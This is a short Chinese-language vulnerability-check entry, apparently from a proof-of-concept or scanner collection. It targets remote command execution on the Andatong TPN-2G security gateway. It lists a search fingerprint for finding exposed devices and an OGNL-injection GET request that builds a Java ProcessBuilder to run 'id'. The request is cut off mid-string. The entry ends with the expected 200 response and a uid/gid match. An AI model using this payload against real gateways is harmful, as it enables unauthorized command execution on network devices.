# 安达通-TPN-2G安全网关-命令执行-admin

- **系统**：安达通-TPN-2G安全网关　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="TPN-2G"`
- **请求**：`GET /lan/admin_getLisence?redirect:${%23a%3dnew%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22id%22}).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23screen%3d%23context.get(%27com.op`
- **预期**：200　|　^(?=.*?uid)(?=.*?gid).*?$